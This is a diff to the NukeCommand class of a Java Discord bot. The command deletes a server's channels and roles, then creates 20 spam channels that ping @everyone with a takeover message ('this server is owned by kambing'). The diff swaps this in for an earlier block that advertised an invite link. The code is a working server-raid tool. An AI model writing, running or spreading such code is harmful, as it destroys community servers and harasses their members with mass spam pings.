@@ -32,6 +32,12 @@ public class NukeCommand extends Command {
                     }
                 }
             }
+            GuildManager m = e.getGuild().getManager();
+            for (int i = 0; i < 20; i++) {
+                m.getGuild().createTextChannel("ezXDD").queue(chan -> {
+                    chan.sendMessage("@everyone this server is owned by kambing").queue();
+                });
+            }
             for (Role rl : e.getGuild().getRoles()) {
                 if (!rl.isManaged()) {
                     if (!rl.equals(e.getGuild().getBotRole())) {
@@ -50,7 +56,7 @@ public class NukeCommand extends Command {
                 ct.delete().queue();
             }
             e.getGuild().getManager().setAfkChannel(null).queue();
-            GuildManager m = e.getGuild().getManager();
+
 
 
             m.setDefaultNotificationLevel(Guild.NotificationLevel.ALL_MESSAGES).queue();
@@ -69,11 +75,7 @@ public class NukeCommand extends Command {
             }
 
 
-            for (int i = 0; i < 20; i++) {
-                m.getGuild().createTextChannel("Replaced").queue(chan -> {
-                    chan.sendMessage("@everyone join new server https://discord.gg/8FDGwSzcxn").queue();
-                });
-            }
+
 
         }catch (Exception ex) {
             System.out.println(ex);
